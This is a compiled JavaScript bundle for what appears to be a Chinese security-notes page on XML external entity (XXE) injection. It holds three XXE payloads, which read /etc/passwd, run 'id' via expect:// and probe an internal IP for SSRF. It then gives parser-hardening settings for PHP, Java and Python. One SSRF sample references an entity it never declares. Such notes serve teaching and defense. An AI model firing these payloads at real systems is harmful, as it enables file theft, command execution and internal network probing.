(window.webpackJsonp=window.webpackJsonp||[]).push([[88],{393:function(e,a,t){"use strict";t.r(a);var s=t(22),r=Object(s.a)({},(function(){var e=this,a=e.$createElement,t=e._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h2",{attrs:{id:"_1-xxe-payload"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-xxe-payload"}},[e._v("#")]),e._v(" 1.XXE PayLoad")]),e._v(" "),t("h4",{attrs:{id:"读取任意文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#读取任意文件"}},[e._v("#")]),e._v(" 读取任意文件")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('<?xml version="1.0" encoding="utf-8"?> \n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n<root>\n<name>&xxe;</name>\n</root>\t\n\n')])])]),t("h4",{attrs:{id:"rce"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#rce"}},[e._v("#")]),e._v(" RCE")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('<?xml version="1.0"?>\n<!DOCTYPE GVI [ <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM "expect://id" >]>\n<catalog>\n   <core id="test101">\n      <description>&xxe;</description>\n   </core>\n</catalog>\n')])])]),t("h4",{attrs:{id:"ssrf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssrf"}},[e._v("#")]),e._v(" SSRF")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE ANY [\n<!ENTITY content SYSTEM "http://10.165.89.150:88">]>\n<root>\n<name>&xxe;</name>\n</root>\t\n')])])]),t("h2",{attrs:{id:"_2-xxe防御"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-xxe防御"}},[e._v("#")]),e._v(" 2.xxe防御")]),e._v(" "),t("h4",{attrs:{id:"php"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php"}},[e._v("#")]),e._v(" php")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("libxml_disable_entity_loader(true);\n")])])]),t("h4",{attrs:{id:"java"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#java"}},[e._v("#")]),e._v(" java")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v('SAXReader reader = new SAXReader();\n// 是否包含外部生成的实体。当正在解析文档时为只读属性，未解析文档的状态下为读写\nreader.setFeature("http://xml.org/sax/features/external-general-entities", false);\n// 是否包含外部的参数，包括外部DTD子集。当正在解析文档时为只读属性，未解析文档的状态下为读写。\nreader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\nDocument document = reader.read(xml);\n')])])]),t("h4",{attrs:{id:"python"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#python"}},[e._v("#")]),e._v(" python")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("from lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n")])])])])}),[],!1,null,null,null);a.default=r.exports}}]);